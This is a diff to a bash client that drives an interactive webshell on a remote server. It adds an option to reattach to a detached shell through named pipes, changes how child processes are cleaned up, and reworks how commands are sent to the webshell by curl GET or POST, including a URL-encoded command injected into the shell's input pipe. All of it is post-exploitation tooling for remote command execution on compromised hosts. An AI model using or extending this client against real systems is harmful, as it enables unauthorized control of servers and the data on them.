@@ -9,6 +9,7 @@ type_stty="no"
 full_stty="no"
 alias_set="no"
 alias_custom=""
+attach="no"
 URL=""
 FI="/tmp/i"
 FO="/tmp/o"
@@ -41,12 +42,13 @@ available_args=(
     "-h"
     "--alias"
     "--alias-custom"
+    "--attach"
 )
 
 
 exit_client() {
     echo -e "\nExiting script."
-    kill $(jobs -p) 2>/dev/null
+    pstree -A -p $$ | grep -Eow "[0-9]+" | grep -v $$ | xargs kill 2>/dev/null
     rm -f $FIFO_PATH
     stty sane
     wait
@@ -74,6 +76,7 @@ help_client () {
     printf "  %s  %-20s%s\n" "-fi,  " "--fi" "Interactive shell works on named pipes, so change name of stdin pipe: {--fi /dev/shm/some_input_pipe}"
     printf "  %s  %-20s%s\n" "-fo,  " "--fo" "Interactive shell works on named pipes, so change name of stdout, stderr pipe: {--fo /dev/shm/some_output_pipe}"
     printf "  %s  %-20s%s\n" "-d,   " "--default" "Script by default works with no interactive webshell. So flags set default interacte option: --interactive, --stty-raw, --stty-python, --alias. If you want change some of option you need provide next option after default options. {-d --stty-script --shell /bin/bash}"
+    printf "  %s  %-20s%s\n" "      " "--attach" "Join a detached running shell process. To join the right shell, you need to use the same pipes that the shell process uses: {--attach --fi /dev/shm/i --fo /dev/shm/o}"
     printf "  %s  %-20s%s\n" "      " "" "To exit in normal mode stty usage: {ctrl+c} or write: {%:exit}. To exit in raw mode stty usage: {ctrl+alt+q}"
 
     exit_client "0"
@@ -112,6 +115,10 @@ while [ "$#" -gt 0 ]; do
                 echo "[-] Error: Argument missing for --stty-custom"
                 exit_client "1"
             fi
+            ;;
+        "--attach")
+            attach="yes"
+            interactive="yes"
             ;;
         "--alias")
             alias_set="yes"
@@ -275,15 +282,19 @@ setup_stty() {
 }
 
 setup_shell() {
-    create_shell
-    get_output &
-    setup_stty
-    sleep 2
-    if [[ "$alias_set" == "yes" ]]; then
-        #export TERM=xterm-256color; alias ls='ls --color'; alias ll='ls -lsaht --color'
-        lcurl "i=%65%78%70%6F%72%74%20%54%45%52%4D%3D%78%74%65%72%6D%2D%32%35%36%63%6F%6C%6F%72%3B%20%61%6C%69%61%73%20%6C%73%3D%27%6C%73%20%2D%2D%63%6F%6C%6F%72%27%3B%20%61%6C%69%61%73%20%6C%6C%3D%27%6C%73%20%2D%6C%73%61%68%74%20%2D%2D%63%6F%6C%6F%72%27%0A&fi=$FI"
-    elif [[ "$alias_set" == "custom" ]]; then
-        lcurl "i=$(urlencode "$alias_custom")%0A&fi=$FI"
+    if [[ "$attach" == "no" ]]; then
+        create_shell
+        get_output &
+        setup_stty
+        sleep 2
+        if [[ "$alias_set" == "yes" ]]; then
+            #export TERM=xterm-256color; alias ls='ls --color'; alias ll='ls -lsaht --color'
+            lcurl "i=%65%78%70%6F%72%74%20%54%45%52%4D%3D%78%74%65%72%6D%2D%32%35%36%63%6F%6C%6F%72%3B%20%61%6C%69%61%73%20%6C%73%3D%27%6C%73%20%2D%2D%63%6F%6C%6F%72%27%3B%20%61%6C%69%61%73%20%6C%6C%3D%27%6C%73%20%2D%6C%73%61%68%74%20%2D%2D%63%6F%6C%6F%72%27%0A&fi=$FI"
+        elif [[ "$alias_set" == "custom" ]]; then
+            lcurl "i=$(urlencode "$alias_custom")%0A&fi=$FI"
+        fi
+    else 
+        get_output &
     fi
  
 }
@@ -354,9 +365,13 @@ if [[ "$interactive" == "yes" ]]; then
         fi
     done
 else 
-    CURL_MAXTIME=2147483647
     while read line; do
-        lcurl "c=$(urlencode "$line")"
+        if [[ " ${CURL_ARGS[@]} " =~ "-X POST" ]]; then
+            curl -s $URL "${CURL_ARGS[@]}" --data "c=$(urlencode "$line")"
+        else
+            curl -s $URL"?c=$(urlencode "$line")" "${CURL_ARGS[@]}" 
+        fi
     done
 fi
+
 
